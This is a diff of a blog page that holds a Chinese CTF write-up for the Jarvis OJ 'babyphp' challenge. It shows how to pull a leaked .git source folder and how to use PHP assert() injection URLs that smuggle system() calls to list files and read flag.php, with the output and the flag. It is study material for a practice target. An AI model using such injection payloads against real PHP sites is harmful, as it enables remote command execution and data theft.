@@ -128,28 +128,12 @@
     <div id="content-inner">
       
       
-  <article id="post">
-    <h1>babyphp</h1>
-    <p class="page-title-sub">
-      <span id = "post-title-date">撰写于 2017-12-30</span>
-      
-        <span id = "post-title-updated">修改于 2017-12-31</span>
-      
-      
-      
-      <span id = "post-title-tags">
-      标签
-      
-      
-        
-        
-        <a href="/tags/web/">web</a>
-      
-      </span>
-      
-    </p>
+  <article id="page">
     
-    <p>&lt; !–more–&gt;<br>1、查看源码：</p>
+    
+      <h1 class="">babyphp</h1>
+      
+      <p>&lt; !–more–&gt;<br>1、查看源码：</p>
 <p><img src="/2017/12/30/babyphp/01.png" alt=""></p>
 <p>可以发现一共有三个page：home，about，contact<br>还有一个可能存在的page：flag.php<br>2、<a href="http://web.jarvisoj.com:32798/?page=flag.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=flag.php</a><br>显示：That file doesn’t exist!<br>3、查看about里面有：PHP，GIT,Bootstrap<br>可能有源码泄露，联系到about中有Git，使用GitHack下载源码<br>4、使用GitHash下载源码方法：<br>cmd，并切换到已经下载GitHash-master的py文件目录下<br>python GitHash.py url.git<br>python GitHash.py <a href="http://web.jarvisoj.com:32798/.git" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/.git</a></p>
 <p><img src="/2017/12/30/babyphp/02.png" alt=""></p>
@@ -158,15 +142,8 @@
 <p><1><a href="http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls</a> templates/;”).’<br>显示：about.phpcontact.phpflag.phphome.phpabout.phpcontact.phpflag.phphome.phpThat file doesn’t exist!</1></p>
 <p><2><a href="http://web.jarvisoj.com:32798/?page=&#39;,&#39;..&#39;)===False" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=&#39;,&#39;..&#39;)===False</a> and system(‘cat templates/flag.php’);//<br>显示：<br>&lt;?php<br>// TODO<br>//$FLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}’;<br>?&gt;<br>That file doesn’t exist!<br>‘,’..’)===False根据assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”)<br>‘,’..’)===False为真<br>system(‘cat templates/flag.php’)<br>显示flag.php的内容<br>*system()函数<br>system — 执行外部程序，并且显示输出<br>string system ( string $command [, int &amp;$return_var ] )<br>参数<br>command<br>要执行的命令。<br>return_var<br>如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。<br>返回值<br>成功则返回命令输出的最后一行， 失败则返回 FALSE<br>FLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}</2></p>
 
-  </article>
-  <div class="random-toc-area">
-  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">显示目录</button>
-  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">隐藏目录</button>
-  <div class="random-toc">
-    <h2>目录</h2>
     
-  </div>
-</div>
+  </article>
 
   
 <nav id="pagination">
